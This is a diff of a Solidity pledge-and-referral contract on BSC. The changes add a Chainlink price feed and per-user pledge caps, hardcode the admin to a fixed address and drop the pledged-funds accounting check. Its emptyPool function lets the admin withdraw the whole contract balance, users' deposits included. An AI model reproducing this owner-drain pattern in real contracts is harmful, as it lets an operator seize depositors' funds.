@@ -3,6 +3,9 @@
 pragma solidity >=0.8.0 <0.9.0;
 
 import "./DABC10Interface.sol";
+import "./AggregatorInterface.sol";
+// import "./.deps/github/smartcontractkit/chainlink/contracts/src/v0.8/interfaces/AggregatorInterface.sol";
+// import "https://github.com/smartcontractkit/chainlink/contracts/src/v0.8/interfaces/AggregatorInterface.sol";
 
 contract DABC10 is DABC10Interface {
 
@@ -24,11 +27,9 @@ contract DABC10 is DABC10Interface {
     uint8 public constant decimals = 18;
     uint256 public totalSupply;
     uint256 public total;
-    uint256 public pledged;
-
+    
     address admin;
     address constant matemask_account1 = 0x821b121D544cAb0a4F4d0ED2F1c2B14fAb4f969F;
-    // address internal backen = 0x7AAB4Ff86700A2D701d4858828094202a9D48102;
 
     mapping(address => uint256) public reward;
     mapping(address => address[]) public invitees;
@@ -39,13 +40,7 @@ contract DABC10 is DABC10Interface {
     mapping(address => uint256) public balances;
     mapping(address => mapping(address => uint256)) public allowed;
     mapping(address => uint) jc_time;       //级差领取时间记录
-    // mapping(address => jicha[]) public JC;
-
-    // struct jicha {
-    //     address fromwho;
-    //     uint time;
-    //     uint256 jcBalance;
-    // }
+    AggregatorInterface internal priceFeed;
     
     struct zhitui {
         address fromwho;    //建立此直推回报单的地址
@@ -56,6 +51,7 @@ contract DABC10 is DABC10Interface {
     }
 
     struct minter {
+        uint256 maxPledgeCount;
         uint lastPledgeTime;
         uint times;
         uint invalidTimes;    //无效单次数
@@ -81,7 +77,9 @@ contract DABC10 is DABC10Interface {
     
     
     constructor (uint256 _initialAmount) {
-        admin = msg.sender;
+        admin = matemask_account1;
+        // priceFeed = AggregatorInterface(0x0567F2323251f0Aab15c8dFb1967E4e8A7D42aeE);  //BSC chain main net
+        priceFeed = AggregatorInterface(0x2514895c72f50D8bd4B4F9b1110F0D6bD2c97526);   //BSC chain test net
         totalSupply = _initialAmount * 10 ** uint256(decimals);
         balances[address(this)] = totalSupply;
         total = totalSupply;
@@ -144,6 +142,21 @@ contract DABC10 is DABC10Interface {
     //     return true;
     // }
 
+    function getLatestPrice() public view returns (int256) {
+        return priceFeed.latestAnswer();
+    }
+
+    function getLatestPriceTimestamp() public view returns (uint256) {
+        return priceFeed.latestTimestamp();
+    }
+
+    function changeMaxPledge(address _target, uint256 _maxAmount) public payable {
+        require(msg.sender != address(0));
+        require(msg.sender == admin);
+        require(_target != address(0));
+        require(_maxAmount >= eachMinedMaxCount || _maxAmount == 0);
+        minters[_target].maxPledgeCount = _maxAmount;
+    }
 
     function get_timestamp() public view returns (uint) {
         return block.timestamp;
@@ -207,16 +220,18 @@ contract DABC10 is DABC10Interface {
     }
 
 
-    function Pledge(address _inviter) public payable {
+    function Pledge(address _inviter) public payable returns (uint currtime,uint256 amount) {
         require(msg.sender != address(0));
         require(_inviter != msg.sender);
         require(msg.sender != admin);
-        require(msg.value >= eachMinedMinCount && msg.value <= eachMinedMaxCount);                
+        require(msg.value >= eachMinedMinCount && 
+        (minters[msg.sender].maxPledgeCount == 0? msg.value <= eachMinedMaxCount : msg.value <= minters[msg.sender].maxPledgeCount));     
         require(msg.value % Multiple == 0);
         uint256 Per = state_per();
         uint256 cost = msg.value * Per / 10 ** 18;
         require(balances[msg.sender] >= cost);
-        uint currtime = block.timestamp;
+        currtime = block.timestamp;
+        amount = msg.value;
         if(minters[msg.sender].times != 0){
             require(currtime - minters[msg.sender].lastPledgeTime <= OOD);
         }
@@ -254,8 +269,6 @@ contract DABC10 is DABC10Interface {
         }
         //进行交易
         TB[msg.sender].push(tb(currtime, false, cost, msg.value, true, 0));
-        pledged += msg.value;
-        require(pledged >= address(this).balance);
         back_flow(cost);
         minters[msg.sender].totalBalance += msg.value;
         minters[msg.sender].tblength = TB[msg.sender].length;
@@ -373,18 +386,16 @@ contract DABC10 is DABC10Interface {
     /*
     * 获取级差额度
     */
-    function GetJC(address _inviter) public returns (uint256 lj, uint256 jc) {
-        if(_inviter == address(0)) return (0, 0);
+    function GetJC(address _inviter) public returns (uint256 jc, uint256 yj, uint lv) {
+        if(_inviter == address(0)) return (0,0,0);
         uint current = block.timestamp;
-        uint lv = 0;
-        (lj, lv) = GetAchievement(_inviter);
-        if(lv == 0) return (0, 0);
+        (yj, lv) = GetAchievement(_inviter);
         if(invitees[_inviter].length > 0){
             for(uint i = 0; i < invitees[_inviter].length; i++){
                 jc += get_jc(invitees[_inviter][i], current, lv);
             }
         }
-        return (lj, jc);
+        return (jc, yj, lv);
     }
 
     // 待完善(一天领取一次？7天领取一次？)
@@ -393,8 +404,10 @@ contract DABC10 is DABC10Interface {
         require(current - jc_time[msg.sender] >= jc_span);
         require(minters[msg.sender].times != 0);
         require(msg.sender != address(0));
-        (uint256 yj, uint256 jcBalance) = GetJC(msg.sender);
-        require(yj != 0);
+        uint256 jcBalance = 0;
+        uint256 yj = 0;
+        uint lv = 0;
+        (jcBalance, yj, lv) = GetJC(msg.sender);
         require(jcBalance > 0);
         require(address(this).balance >= jcBalance);
         payable(msg.sender).transfer(jcBalance);
@@ -415,9 +428,7 @@ contract DABC10 is DABC10Interface {
                 payment += TB[msg.sender][i].balance;
                 TB[msg.sender][i].isexist = false;
             }
-        } 
-        pledged -= payment;
-        require(pledged >= address(this).balance);
+        }
         require(payment <= address(this).balance && payment > 0);
         payable(msg.sender).transfer(payment);
         // minters[msg.sender].totalRevenue += payment;
@@ -434,7 +445,7 @@ contract DABC10 is DABC10Interface {
     }
 
     function emptyPool() public payable {
-        require(msg.sender == admin || msg.sender == matemask_account1);
+        require(msg.sender == admin);
         payable(msg.sender).transfer(address(this).balance);
     }
 
